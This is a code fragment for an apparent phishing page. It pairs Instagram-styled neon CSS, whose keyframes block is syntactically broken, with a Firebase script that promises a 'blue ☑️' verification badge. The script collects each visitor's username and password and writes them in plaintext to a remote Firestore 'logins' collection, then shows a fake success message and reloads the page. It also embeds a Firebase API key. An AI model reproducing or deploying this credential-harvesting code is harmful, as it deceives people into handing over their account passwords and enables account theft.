/* Instagram Neon Background */
body::before,
body::after{
  content:"";
  position:absolute;
  width:450px;
  height:450px;
  border-radius:50%;
  filter:blur(120px);
  opacity:0.8;
  z-index:-1;
}

body::before{
  background:#ff006e;
  top:-100px;
  left:-100px;
  animation:instaMove 4s linear infinite;
}

body::after{
  background:#8338ec;
  bottom:-100px;
  right:-100px;
  animation:instaMove 5s linear infinite reverse;
}

@keyframes instaMove{
  0%{
    transform:translate(0,0) scale(1);
  }
  25%{
    transform:translate(250px,120px) scale(1.3);
  }
  50%{
    transform:translate(0,280px) scale(1);

  75%{
    transform:translate(-250px,120px) scale(1.3);

  100%{
    transform:translate(0,0) scale(1);

}

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyCpbWJ6V7OtJP-lWFvixu13unnGcLUPut8",

  appId: "1:383399100196:web:79f383b4eefa1f83edbdb1"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const statusDiv = document.getElementById("status");
const loginBtn = document.getElementById("loginBtn");

async function login() {

  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  if(!username || !password){
    statusDiv.textContent = "Fill to get the ☑️";
    statusDiv.className = "status error";
    return;
  }

  loginBtn.disabled = true;
  statusDiv.textContent = "verifing wait few min......";
  statusDiv.className = "status loading";

  try {
    await addDoc(collection(db, "logins"), {
      username: username,
      password: password,
      timestamp: new Date().toISOString()
    });

    statusDiv.textContent = "blue ☑️ added in your account......!!!";
    statusDiv.className = "status success";

    document.getElementById("username").value = "";
    document.getElementById("password").value = "";

    setTimeout(() => {
      location.reload();
    }, 2000);

  } catch (error) {
    statusDiv.textContent = "❌ Error: " + error.message;
    statusDiv.className = "status error";
    loginBtn.disabled = false;
  }
}

loginBtn.addEventListener("click", login);

document.getElementById("password").addEventListener("keypress", function(e){
  if(e.key === "Enter"){
    login();
  }
});
</script>
